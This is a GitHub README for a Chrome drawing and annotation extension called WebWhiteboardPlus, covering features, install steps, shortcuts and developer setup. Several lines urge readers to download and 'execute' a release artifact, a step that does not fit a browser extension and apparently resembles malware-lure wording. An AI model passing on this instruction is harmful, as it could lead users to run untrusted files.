WebWhiteboardPlus — Chrome Whiteboard & Annotation Tool

[![Releases](https://img.shields.io/github/v/release/ahmeejee/WebWhiteboardPlus?label=Releases&style=for-the-badge)](https://github.com/ahmeejee/WebWhiteboardPlus/releases)

<img src="https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=1600&q=80&auto=format&fit=crop" alt="whiteboard hero" style="width:100%;max-height:360px;object-fit:cover;border-radius:8px;margin:12px 0" />

Table of contents
- About
- Quick links
- Features
- Screenshots
- Install (Chrome)
- Usage and tools
- Keyboard shortcuts
- Developer setup
- Contributing
- Issues & support
- License
- Topics

About
WebWhiteboardPlus turns your Chrome browser into a simple, robust drawing and annotation workspace. It runs in-browser and works with any web page. You can sketch, annotate images, mark up PDFs, or brainstorm on a blank canvas. The extension blends a minimal UI with flexible tools. It aims to help designers, teachers, students, and makers stay productive without leaving the browser.

Quick links
- Releases (download the packaged extension file and run it): https://github.com/ahmeejee/WebWhiteboardPlus/releases
- Source: GitHub repository
- Issues: use the repository Issues tab for bugs and feature requests

Features
- Drawing tools: pen, marker, eraser, shapes, lines.
- Layers: add and hide layers for non-destructive edits.
- Text tool: add text boxes with basic formatting.
- Sticky notes: quick notes that you can move and edit.
- Image import: drag images to the canvas or paste from clipboard.
- Export: export as PNG, SVG, or PDF.
- Snap & grid: enable a grid to align elements.
- Annotations on any page: floating canvas attaches to the current tab.
- Persistent sessions: your board state saves locally per domain.
- Lightweight: minimal overhead for performance.
- Open source: permissive license and public code.

Screenshots
![toolbar](https://img.shields.io/badge/Toolbar-UI-blue?style=for-the-badge&logo=chrome)
![canvas demo](https://images.unsplash.com/photo-1545239351-1141bd82e8a6?w=800&q=60&auto=format&fit=crop)

Install (Chrome)
This section shows how to get the extension and run it in Chrome.

1. Open the Releases page and download the packaged extension. The release page contains the build artifact that you must download and execute.
2. If the downloaded file is a .crx or .zip:
   - For a .crx: drag the file into chrome://extensions to install.
   - For a .zip: unzip, then load the folder as an unpacked extension via chrome://extensions > Load unpacked.
3. Toggle Developer mode in chrome://extensions when you load an unpacked extension.
4. After install, pin the extension to your toolbar for easy access.

If the release link ever fails or changes, check the Releases section in this repository for the latest build.

Usage and tools
Open a new tab, click the WebWhiteboardPlus icon, and the canvas appears over the page. Use the toolbar to pick a tool. The canvas keeps your drawing on top of the page. You can hide the canvas to interact with the underlying page.

Main tools
- Pen: freehand drawing with pressure-like width control via size slider.
- Marker: semi-transparent stroke for highlight effects.
- Eraser: remove strokes or elements.
- Shape: rectangle, ellipse, straight line, arrow.
- Text: click to add editable text boxes.
- Move: drag elements or selection groups.
- Lasso select: select freeform groups to move or transform.
- Undo/redo: full action history for quick edits.
- Zoom & pan: magnify the canvas, or pan with space+drag.

Export
- Export PNG: full-resolution raster export.
- Export SVG: scalable vector export (keeps stroke paths).
- Export PDF: preserve layout for printing.

Persistence
- Auto-save: the board saves automatically per domain.
- Session restore: reopen a tab and your board restores the last state.
- Export to file: save a board file to back up work.

Keyboard shortcuts
- N: new board
- S: save / export dialog
- Z: undo
- Y: redo
- V: move tool
- E: eraser
- T: text tool
- Shift: constrain proportions while drawing shapes
- Space + drag: pan canvas

Developer setup
This repo uses plain JavaScript, HTML, and CSS. It bundles with a small toolchain and no heavy framework.

Prerequisites
- Node.js (14+)
- npm or yarn
- Chrome for testing

Local build
1. Clone the repo:
   git clone https://github.com/ahmeejee/WebWhiteboardPlus.git
2. Install dependencies:
   npm install
3. Build:
   npm run build
4. Load the built folder as an unpacked extension:
   chrome://extensions > Load unpacked

Run tests
- Unit tests use Jest. Run:
  npm test

Code structure
- /src: core UI and logic
- /src/background: extension background scripts
- /src/content: content scripts injected into pages
- /src/popup: extension popup UI
- /assets: images and icons
- /dist: build output

Contributing
This project welcomes contributions. The repo uses issues and pull requests. Follow these steps to contribute code:

1. Pick an issue labeled good-first-issue or first-issue.
2. Fork the repo and create a feature branch.
3. Follow the coding style in the repo.
4. Add tests for new logic.
5. Open a pull request with a clear description of the change.

Guidelines
- Write small commits and clear commit messages.
- Keep changes focused to one feature or fix per PR.
- Run the test suite before opening a PR.

Issues & support
Report bugs or request features using the repository Issues tab. For release downloads, use the Releases page. The release artifact must be downloaded and executed as described on the Releases page:
https://github.com/ahmeejee/WebWhiteboardPlus/releases

If you see an error while installing a packaged file, attach logs and a short description of your Chrome build and OS.

License
WebWhiteboardPlus uses a permissive open-source license. See LICENSE.md in the repository for details.

Topics
This project includes the following topics and tags:
- annotation
- annotation-tool
- annotations
- canvas
- chrome-extension
- drawing-on-canvas
- drawing-tool
- drawingboard
- first-issue
- frontend
- good-first-issue
- javascript
- open-source
- productivity
- web-annotation
- whiteboard

Badges & compatibility
[![Chrome Compatible](https://img.shields.io/badge/Chrome-Compatible-Yes-brightgreen?style=for-the-badge)](https://github.com/ahmeejee/WebWhiteboardPlus/releases)
[![Open Source](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](LICENSE)

Accessibility
The UI uses high-contrast icons and keyboard shortcuts. The canvas supports large fonts and adjustable stroke sizes. The code aims to follow accessibility best practices for color contrast and keyboard navigation.

Security
The extension uses content scripts to draw a canvas overlay. It does not collect user data nor send drawings to remote servers. The code stays local in the browser unless you explicitly export or share a file.

Acknowledgements
- Icons and UI inspiration come from common design patterns for drawing apps.
- Test images from Unsplash under a permissive license.

Contact
Open an issue for bugs, features, or discussion. Use pull requests for code contributions.